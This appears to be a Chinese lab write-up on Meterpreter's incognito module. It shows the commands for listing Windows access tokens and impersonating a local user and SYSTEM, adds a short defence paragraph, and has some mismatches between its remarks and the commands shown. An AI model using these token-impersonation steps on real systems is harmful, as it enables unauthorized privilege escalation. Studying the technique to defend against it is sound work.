ailx10说：这篇是2022年1月之前写的，后来又改过。拿到 Meterpreter 会话后，我接着试 incognito，列出委派和模拟令牌，再切到看到的用户身份与 SYSTEM，观察会话怎么变化。之前身份像一个固定标签，这次才直观看到进程手里还可能握着别人的访问材料。笔记记下的是当时可用令牌和切换过程，不是凭空伪造任何用户。它让我把已有权限、登录会话和可模拟对象联系起来；先问机器上有什么、自己能碰到什么，再看工具输出，远比只记一条 impersonate 命令更清楚。

## 1、令牌窃取

- 进入session中
- 输入`use incognito`
- 输入`list_tokens -u`

![](/notes-assets/e8593d6673e6722c39eb.jpg)

得到授权令牌：

```
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-D2GN1OUFTMB\ailx04
```

得到模拟令牌：

```
NT AUTHORITY\ANONYMOUS LOGON
```

选择可用令牌并尝试模拟，能否成功取决于令牌类型、权限和进程上下文。

咱们先拿这个ailx04的令牌，whoami显示的就是ailx04

注意这里的双斜杠

```
impersonate_token WIN-D2GN1OUFTMB\ailx04
```

![](/notes-assets/eabe0bed13821df5c40d.jpg)

再来一个system权限，whoami显示的就是system

注意这里的双引号

![](/notes-assets/e5a6018560c878e72d76.jpg)

## 2、针对令牌窃取的防御措施

降低高权限会话暴露，限制本地管理员与调试权限，及时修补并监测异常令牌使用；加密网络传输不能直接防止本机令牌滥用。

本篇完～

令牌模拟让我看见了进程身份可以怎样被借用，也提醒我别把它想成任意制造凭据。最关键的仍是起始权限、令牌来源和实际能访问到的资源。
